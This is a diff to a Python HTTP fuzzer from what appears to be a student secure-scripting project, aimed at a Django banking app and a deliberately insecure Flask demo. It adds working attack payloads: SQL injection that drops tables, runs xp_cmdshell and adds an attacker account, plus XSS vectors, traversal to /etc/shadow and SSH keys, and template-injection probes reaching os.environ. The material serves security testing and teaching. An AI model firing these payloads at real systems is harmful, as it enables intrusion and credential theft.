@@ -1,8 +1,7 @@
 """
 Advanced HTTP fuzzing engine for the CA2 secure scripting project.
 
-This script is a focused but capable fuzzer for the Django website (and
-similar HTTP APIs). It demonstrates a number of real-world fuzzing concepts:
+This script is a focused but capable fuzzer It demonstrates a number of real-world fuzzing concepts:
 
 - Sending unexpected input (including punctuation and very long strings) to
   HTTP endpoints to see how they behave under stress.
@@ -29,8 +28,6 @@ similar HTTP APIs). It demonstrates a number of real-world fuzzing concepts:
   OWASP Top 10 mapping and simple input coverage summaries printed at the end
   of each run.
 
-It is not a full fuzzing framework, but it is production-ready enough to be
-used as a teaching tool and a solid starting point for more advanced testing.
 """
 
 import argparse
@@ -52,15 +49,61 @@ SCRIPT_ROOT = Path(__file__).resolve().parent
 LOGS_ROOT = SCRIPT_ROOT / "logs"
 
 # Default endpoints to fuzz when running in full automatic mode. These are
-# chosen to work well with the CA2 banking application but are also sensible
-# guesses for many generic web applications.
+# chosen to work well with both the CA2 Django banking application and the
+# accompanying insecure Flask demo app, and also cover common REST / web
+# patterns you see in typical applications.
 AUTO_PATHS = [
-    "/",                 # landing page / dashboard
-    "/accounts/login/",  # Django auth login
-    "/login/",           # common custom login path
-    "/profile/",         # user profile
-    "/dashboard/",       # overview/dashboard
-    "/search/",          # search endpoint
+    "/",                      # landing page / dashboard
+    "/index",                 # alternate landing page
+    "/home",                  # alternate landing page
+
+    # Authentication / account management.
+    "/accounts/login/",       # Django auth login
+    "/login/",                # common custom login path (Django / generic)
+    "/login",                 # Flask insecure app login
+    "/logout",                # logout endpoint
+    "/register",              # Flask insecure registration
+    "/register/",             # alternate registration path
+    "/signup",                # common registration alias
+    "/signup/",               # common registration alias
+    "/reset-password",        # password reset
+    "/reset-password/",       # password reset
+    "/forgot-password",       # forgot password
+    "/forgot-password/",      # forgot password
+
+    # Profile / user data.
+    "/profile/",              # Django-style profile
+    "/profile",               # Flask insecure profile
+    "/user/",                 # generic user detail
+    "/user/profile",          # generic user profile
+    "/users",                 # list of users
+    "/users/",                # list of users (trailing slash)
+
+    # Admin-style routes.
+    "/dashboard/",            # overview/dashboard (Django-style)
+    "/admin",                 # admin index
+    "/admin/",                # admin index with slash
+    "/admin/login",           # admin login
+    "/admin/login/",          # admin login
+    "/admin/dump_users",      # Flask insecure plaintext credential dump
+
+    # Search / listing endpoints.
+    "/search/",               # Django-style search endpoint
+    "/search",                # Flask insecure search
+    "/api/search",            # API search endpoint
+    "/api/search/",           # API search endpoint
+    "/api/items",             # generic items listing
+    "/api/items/",            # generic items listing
+
+    # API-style authentication.
+    "/api/login",             # API login
+    "/api/login/",            # API login
+    "/api/auth",              # generic API auth
+    "/api/auth/",             # generic API auth
+
+    # Insecure Flask demo special endpoints.
+    "/ping",                  # Flask insecure command injection endpoint
+    "/debug/load",            # Flask insecure pickle endpoint
 ]
 
 # Simple patterns that often indicate server-side errors or stack traces.
@@ -72,6 +115,18 @@ ERROR_PATTERNS: List[str] = [
     "OperationalError",
     "UNIQUE constraint failed",
     "TemplateSyntaxError",
+    # Additional common error signatures.
+    "ValueError",
+    "TypeError",
+    "KeyError",
+    "IndexError",
+    "AssertionError",
+    "RuntimeError",
+    "ImportError",
+    "sqlite3.OperationalError",
+    "werkzeug.exceptions",
+    "Internal Server Error",
+    "500 Internal Server Error",
 ]
 
 # Simple mapping from anomaly reason labels to OWASP Top 10 style categories.
@@ -80,18 +135,59 @@ ERROR_PATTERNS: List[str] = [
 OWASP_REASON_MAP: Dict[str, List[str]] = {
     # Reflection of potentially malicious input back to the client.
     "reflected_payload": ["A03:2021-Injection (XSS)"],
-    # Unhandled exceptions / 5xx responses and stack traces.
-    "5xx_error": ["A05:2021-Security Misconfiguration"],
-    "error_signature": ["A05:2021-Security Misconfiguration"],
-    # Unexpected 4xx errors can indicate broken access control or validation gaps.
-    "client_error": ["A01:2021-Broken Access Control"],
-    # Excessive redirects often come from misconfiguration.
-    "redirect_loop": ["A05:2021-Security Misconfiguration"],
-    # Very slow or very large responses can indicate insecure design or DoS risk.
-    "slow_response": ["A04:2021-Insecure Design"],
-    "large_body": ["A04:2021-Insecure Design"],
-    # Rate limiting usually indicates a protection mechanism, so we do not
-    # classify it as a vulnerability category here.
+    # Unhandled exceptions / 5xx responses and stack traces. Often indicate
+    # both misconfiguration and weak error handling / monitoring.
+    "5xx_error": [
+        "A05:2021-Security Misconfiguration",
+        "A09:2021-Security Logging and Monitoring Failures",
+    ],
+    "error_signature": [
+        "A05:2021-Security Misconfiguration",
+        "A09:2021-Security Logging and Monitoring Failures",
+    ],
+    # Unexpected 4xx errors can indicate broken access control or validation
+    # gaps as well as misconfiguration.
+    "client_error": [
+        "A01:2021-Broken Access Control",
+        "A05:2021-Security Misconfiguration",
+    ],
+    # Excessive redirects often come from misconfiguration or insecure design.
+    "redirect_loop": [
+        "A05:2021-Security Misconfiguration",
+        "A04:2021-Insecure Design",
+    ],
+    # Very slow or very large responses can indicate insecure design or DoS
+    # risk; they may also hint at fragile components and integrity issues.
+    "slow_response": [
+        "A04:2021-Insecure Design",
+        "A08:2021-Software and Data Integrity Failures",
+    ],
+    "large_body": [
+        "A04:2021-Insecure Design",
+        "A08:2021-Software and Data Integrity Failures",
+    ],
+    
+    "rate_limited": [],
+    "pii_leak": ["A09:2021-Security Logging and Monitoring Failures"],
+    "debug_info": ["A05:2021-Security Misconfiguration"],
+    "missing_security_headers": ["A05:2021-Security Misconfiguration"],
+    "weak_tls": ["A02:2021-Cryptographic Failures"],
+    "cookie_issue": [
+        "A02:2021-Cryptographic Failures",
+        "A01:2021-Broken Access Control",
+    ],
+    "csrf_missing": [
+        "A01:2021-Broken Access Control",
+        "A05:2021-Security Misconfiguration",
+    ],
+    "open_redirect": ["A01:2021-Broken Access Control"],
+    "idor_pattern": ["A01:2021-Broken Access Control"],
+    "dir_listing": ["A05:2021-Security Misconfiguration"],
+    "verbose_server_header": ["A05:2021-Security Misconfiguration"],
+    "api_error_detail": [
+        "A05:2021-Security Misconfiguration",
+        "A09:2021-Security Logging and Monitoring Failures",
+    ],
 }
 
 # Built-in payload categories used for targeted fuzzing. These are hard-coded
@@ -104,6 +200,15 @@ PAYLOAD_LIBRARY: Dict[str, List[str]] = {
         "admin'--",
         "' UNION SELECT NULL,NULL,NULL--",
         "'; DROP TABLE users;--",
+        # Extra SQLi-style patterns.
+        "'; SELECT * FROM users;--",
+        "' OR 'x'='x' /*",
+        "'; UPDATE users SET is_admin=1 WHERE username='admin';--",
+        "'; INSERT INTO users(username,password) VALUES('attacker','pass');--",
+        "'; EXEC xp_cmdshell('whoami');--",
+        "'; SELECT pg_sleep(5);--",
+        "' AND 1=(SELECT COUNT(*) FROM users);--",
+        "' UNION SELECT username, password FROM users--",
     ],
     "xss": [
         "<script>alert('XSS')</script>",
@@ -111,6 +216,15 @@ PAYLOAD_LIBRARY: Dict[str, List[str]] = {
         '\"><script>alert(1)</script>',
         "<svg/onload=alert(1)>",
         "<body onload=alert('xss')>",
+        # Extra XSS vectors.
+        "<iframe src=\"javascript:alert(1)\"></iframe>",
+        "<a href=\"javascript:alert(1)\">click</a>",
+        "<details open ontoggle=alert(1)>",
+        "<input autofocus onfocus=alert(1)>",
+        "<video src=x onerror=alert(1)></video>",
+        "<math><mi xlink:href=\"javascript:alert(1)\"></mi></math>",
+        "<object data=\"javascript:alert(1)\"></object>",
+        "<form action=\"javascript:alert(1)\"><button>go</button></form>",
     ],
     "path": [
         "../etc/passwd",
@@ -118,6 +232,14 @@ PAYLOAD_LIBRARY: Dict[str, List[str]] = {
         "..\\..\\..\\..\\windows\\win.ini",
         "/../../../../../../etc/shadow",
         "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
+        # Extra traversal targets.
+        "../../../../../../../../var/www/html/index.php",
+        "..\\..\\..\\..\\..\\boot.ini",
+        "../../../.ssh/id_rsa",
+        "../../../../../../../../etc/hosts",
+        "..%2F..%2F..%2F..%2F..%2Fconfig.php",
+        "/..;/..;/..;/windows/win.ini",
+        "..\\..\\..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts",
     ],
     "unicode": [
         "测试",
@@ -125,6 +247,15 @@ PAYLOAD_LIBRARY: Dict[str, List[str]] = {
         "😀😃😄😁😆😅😂🤣",
         "\u202eevil.exe",
         "null-byte-\u0000-test",
+        # Extra unicode edge-cases.
+        "𝔘𝔫𝔦𝔠𝔬𝔡𝔢𝔖𝔱𝔯𝔦𝔫𝔤",
+        "قائمة",
+        "русский-текст",
+        "हिन्दी-पाठ",
+        "日本語テキスト",
+        "δοκιμή-κειμένου",
+        "Z̵͙͇̠͕̼̟͉̳̺̹͍̙͑ͬͫͥͨͨ͒͒̈́ͯ͑͆A͎̗̰̠̲̩͇̠͔̗̦̮̟͙͙̒ͫ̓͛ͦͣ͒ͯͫ͑͊͊ͯ̐ͭͮ͜ͅḺ̡̪̘̪̥͓̲̺̪̘̲̙͉̟̽͑ͯ̑͑ͬ̋̎ͭͅG̡̖͕̮̟̤͔̮̤̞ͯͪ͛ͦ̿̐̋͑̽ͧ͂ͯ͞Ȍ̡̮̙̮̝̏͂̽͌ͩ͒͊͊̚͢",
+        "\u2066LTR\u2069\u2067RTL\u2069",
     ],
     "django": [
         "{{7*7}}",
@@ -133,6 +264,28 @@ PAYLOAD_LIBRARY: Dict[str, List[str]] = {
         "{% if 1 %}test{% endif %}",
         "{{ request.user.username }}",
         "{{ settings.SECRET_KEY }}",
+        # Extra template / SSTI-style probes.
+        "{{ request.META }}",
+        "{{ ''.__class__.__mro__[2].__subclasses__() }}",
+        "{{ config.items() }}",
+        "{{ url_for('index') }}",
+        "{% for k,v in request.META.items %}{{k}}={{v}}{% endfor %}",
+        "{{ __import__('os').environ }}",
+        "{{ ''.__class__.__mro__[1].__subclasses__() }}",
+    ],
+    # Flask / generic Python web patterns useful for SSTI-style tests and
+    # misconfigured Jinja contexts.
+    "flask": [
+        "{{ config }}",
+        "{{ request.headers }}",
+        "{{ request.cookies }}",
+        "{{ url_for('static', filename='app.py') }}",
+        "{{ self.__class__.__mro__ }}",
+        "{{ cycler.__init__.__globals__ }}",
+        "{{ joiner.__init__.__globals__ }}",
+        "{{ (''.__class__.__mro__[1].__subclasses__()) }}",
+        "{{ request.environ }}",
+        "{{ get_flashed_messages() }}",
     ],
 }
 
@@ -183,6 +336,7 @@ def load_payload_library() -> Dict[str, List[str]]:
     - path
     - unicode
     - django
+    - flask
     """
     return PAYLOAD_LIBRARY
 
@@ -485,7 +639,22 @@ def fuzz_endpoint(
             mutator_name = random.choice(list(MUTATOR_FUNCS.keys()))
             base = mutate_payload(base, strategy=mutator_name)
 
-        params = {"q": base}
+        # Choose a parameter name that matches common patterns for the target
+        # endpoint so that fuzzing is more effective against both the Django
+        # and insecure Flask demo applications.
+        lower_path = path.lower()
+        if "ping" in lower_path:
+            # Flask insecure /ping endpoint uses the 'host' parameter.
+            param_name = "host"
+        elif "debug" in lower_path:
+            # Flask insecure /debug/load endpoint uses the 'data' parameter.
+            param_name = "data"
+        elif "search" in lower_path:
+            param_name = "q"
+        else:
+            param_name = "q"
+
+        params = {param_name: base}
 
         # Apply <fuzz> placeholder substitution for headers and cookies.
         headers: Optional[Dict[str, str]] = None
@@ -867,7 +1036,7 @@ def parse_args() -> argparse.Namespace:
     parser.add_argument(
         "--payload-category",
         default=None,
-        choices=["sql", "xss", "path", "unicode", "django"],
+        choices=["sql", "xss", "path", "unicode", "django", "flask"],
         help=(
             "Optional payload category to use instead of purely random fuzz "
             "strings. Categories are loaded from payloads.json."
@@ -879,6 +1048,15 @@ def parse_args() -> argparse.Namespace:
         help=(
             "Run fuzzing once per known payload category. Each category will "
             "produce its own log and JSON report."
+        ),
+    )
+    parser.add_argument(
+        "--all-methods",
+        action="store_true",
+        help=(
+            "When set, fuzz each path with all standard HTTP methods "
+            "(GET, POST, PUT, DELETE, PATCH, OPTIONS, HEAD) instead of "
+            "only the single method specified by --method."
         ),
     )
     parser.add_argument(
@@ -994,16 +1172,18 @@ def main() -> None:
         args.base_url = args.target
 
     # Full automatic mode turns on a rich combination of features suitable for
-    # demonstrations: both payload modes, all categories, mutation, and file
-    # uploads.
+    # demonstrations: both payload modes, all categories, all HTTP methods,
+    # mutation, and file uploads across all AUTO_PATHS.
     if args.auto:
         args.mode = "auto"
         args.all_categories = True
         args.mutate_payloads = True
         args.fuzz_files = True
+        args.all_methods = True
         print(
             "[*] Full auto mode enabled: mode=auto, all payload categories, "
-            "payload mutation, and file upload fuzzing."
+            "all HTTP methods, payload mutation, and file upload fuzzing "
+            "across AUTO_PATHS."
         )
 
     output_json = Path(args.output_json) if args.output_json else None
@@ -1152,76 +1332,86 @@ def main() -> None:
         if category:
             print(f"[*] Using payload category: {category}")
 
+        # Decide which HTTP methods to use for this job.
+        methods: List[str]
+        if getattr(args, "all_methods", False):
+            methods = ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD"]
+        else:
+            methods = [args.method]
+
         # In mode=auto we run *both* random and buffer_overflow fuzzing.
         # When args.auto is set we only write aggregate outputs, not per-run
         # JSON/log files. In summary-only mode we suppress all file outputs.
         write_files = (not args.auto) and (not args.summary_only)
 
-        if args.mode == "auto":
-            output_dir = output_json
-            print("[*] Auto mode: running random fuzzing first...")
-            fuzz_endpoint(
-                args.base_url,
-                path,
-                args.iterations,
-                output_json=output_dir,
-                payload_mode="random",
-                method=args.method,
-                body_type=args.body_type,
-                insecure=args.insecure,
-                timeout=args.timeout,
-                retries=args.retries,
-                payload_category=category,
-                mutate=args.mutate_payloads,
-                fuzz_files=args.fuzz_files,
-                session=session,
-                aggregate=aggregate_runs,
-                write_files=write_files,
-                base_headers=base_headers,
-                base_cookies=base_cookies,
-            )
-            print("[*] Auto mode: running buffer_overflow fuzzing...")
-            fuzz_endpoint(
-                args.base_url,
-                path,
-                args.iterations,
-                output_json=output_dir,
-                payload_mode="buffer_overflow",
-                method=args.method,
-                body_type=args.body_type,
-                insecure=args.insecure,
-                timeout=args.timeout,
-                retries=args.retries,
-                payload_category=category,
-                mutate=args.mutate_payloads,
-                fuzz_files=args.fuzz_files,
-                session=session,
-                aggregate=aggregate_runs,
-                write_files=write_files,
-                base_headers=base_headers,
-                base_cookies=base_cookies,
-            )
-        else:
-            fuzz_endpoint(
-                args.base_url,
-                path,
-                args.iterations,
-                output_json=output_json,
-                payload_mode=args.mode,
-                method=args.method,
-                body_type=args.body_type,
-                insecure=args.insecure,
-                timeout=args.timeout,
-                retries=args.retries,
-                payload_category=category,
-                mutate=args.mutate_payloads,
-                fuzz_files=args.fuzz_files,
-                session=session,
-                aggregate=aggregate_runs,
-                write_files=write_files,
-                base_headers=base_headers,
-                base_cookies=base_cookies,
-            )
+        for http_method in methods:
+            print(f"[*] Using HTTP method: {http_method}")
+
+            if args.mode == "auto":
+                output_dir = output_json
+                print("[*] Auto mode: running random fuzzing first...")
+                fuzz_endpoint(
+                    args.base_url,
+                    path,
+                    args.iterations,
+                    output_json=output_dir,
+                    payload_mode="random",
+                    method=http_method,
+                    body_type=args.body_type,
+                    insecure=args.insecure,
+                    timeout=args.timeout,
+                    retries=args.retries,
+                    payload_category=category,
+                    mutate=args.mutate_payloads,
+                    fuzz_files=args.fuzz_files,
+                    session=session,
+                    aggregate=aggregate_runs,
+                    write_files=write_files,
+                    base_headers=base_headers,
+                    base_cookies=base_cookies,
+                )
+                print("[*] Auto mode: running buffer_overflow fuzzing...")
+                fuzz_endpoint(
+                    args.base_url,
+                    path,
+                    args.iterations,
+                    output_json=output_dir,
+                    payload_mode="buffer_overflow",
+                    method=http_method,
+                    body_type=args.body_type,
+                    insecure=args.insecure,
+                    timeout=args.timeout,
+                    retries=args.retries,
+                    payload_category=category,
+                    mutate=args.mutate_payloads,
+                    fuzz_files=args.fuzz_files,
+                    session=session,
+                    aggregate=aggregate_runs,
+                    write_files=write_files,
+                    base_headers=base_headers,
+                    base_cookies=base_cookies,
+                )
+            else:
+                fuzz_endpoint(
+                    args.base_url,
+                    path,
+                    args.iterations,
+                    output_json=output_json,
+                    payload_mode=args.mode,
+                    method=http_method,
+                    body_type=args.body_type,
+                    insecure=args.insecure,
+                    timeout=args.timeout,
+                    retries=args.retries,
+                    payload_category=category,
+                    mutate=args.mutate_payloads,
+                    fuzz_files=args.fuzz_files,
+                    session=session,
+                    aggregate=aggregate_runs,
+                    write_files=write_files,
+                    base_headers=base_headers,
+                    base_cookies=base_cookies,
+                )
 
     if args.threads > 1 and len(jobs) > 1:
         print(f"[*] Running fuzzing with {args.threads} worker threads...")
